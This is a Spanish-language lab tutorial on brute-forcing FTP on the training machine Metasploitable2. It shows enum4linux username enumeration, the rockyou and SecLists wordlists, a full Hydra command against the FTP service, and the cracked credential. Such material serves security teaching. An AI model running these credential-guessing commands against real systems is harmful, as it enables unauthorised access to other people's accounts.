# 24. Fuerza Bruta a un FTP con Hydra

Vamos a mostrar cómo hacer el ataque de fuerza bruta a un FTP, a un servicio FTP, a la máquina vulnerable Metasploitable2.

Vamos a armar un diccionario muy sencillo con posibles contraseñas. Tenemos un usuario.

## Uso de enum4linux

Vamos a enumerar, vamos a utilizar `enum4linux`:

```bash
enum4linux <ip-metasploitable2>
```

Vamos a tirar el host que es la IP de la máquina Metasploitable2, y acá nos aparece datos, nos aparece posibles **username**. Tenemos:

```plaintext
Known Usernames ..  administrator, guest, krbtgt, domain admins, root, bin, none
```

Con estas herramientas, podemos también ver posibles nombres de usuario, posibles username que podemos utilizar para armar un diccionario con
posibles usernames.

## Ataque de fuerza bruta con Hydra

Bien, acá vamos a hacer el ataque de fuerza bruta al FTP. Vamos a utilizar **Hydra** para este ataque:

```bash
hydra
```

Acá nos dice un ejemplo de como vendría siendo la sintaxis.

Con `-l`, si tenemos un usuario que ya conocemos, ponemos el usuario. En este caso, va a ser `msfadmin`:

```bash
hydra -l msfadmin
```

Y si ya conocemos una password que puede ser, con `-p`, ponemos la posible password. En este caso, vamos a hacerlo con un diccionario.

Diccionarios que podemos utilizar ya creados. Podemos utilizar uno que se llama `rockyou.txt`.
Hay una wordlist que podemos utilizar que se llama `rockyou.txt` que se encuentra en la ruta `/usr/share/wordlists`.

Lo que hacemos es abrir una nueva terminal y hacemos:

```bash
sudo su
```

Y hacemos un:

```bash
cd
```

Para irnos al directorio raíz, al directorio principal.

Vamos a:

```bash
cd /usr/share/
cd wordlists/
pwd
ls
```

Y acá estamos en el directorio `/usr/share/wordlists`. Acá tenemos diccionarios para hacer ataques de fuerza bruta.

Vamos a ir a la carpeta `seclists`:

```bash
cd seclists
ls
```

Y podemos hacer ataques de contraseñas. Vamos ir a:

```bash
cd Passwords/
ls
```

Y acá tenemos lo que vendría siendo diccionarios de fuerza bruta.

Podemos utilizar cualquiera de estos otros, pero mejor si hacemos uno nosotros mismos.

Si queremos podemos utilizar cualquiera de estos diccionarios, pero en nuestro caso, vamos a utilizar uno personalizado.

Bien, voy a hacer:

```bash
hydra -l msfadmin -P diccionario.txt ftp://<ip-metasploitable2>
```

* `-l`: El usuario que ya encontramos
* `-P`. Es la lista de posibles contraseñas. En nuestro caso vamos utilizar una que ya hicimos, se llama **diccionario.txt**.
* `ftp://<ip-metasploitable2>`: Esta es la máquina de la víctima.

Bien, vamos a correr el ataque de fuerza bruta. Y acá nos encontró una contraseña en el **puerto 21**, FTP.

Acá se "logueo" con el user **msfadmin** y la password que lo sacamos de la lista de contraseñas que creamos anteriormente, **msfadmin**:

```plaintext
[21][ftp] host: <ip-metasploitable2> login: msfadmin password: msfadmin
```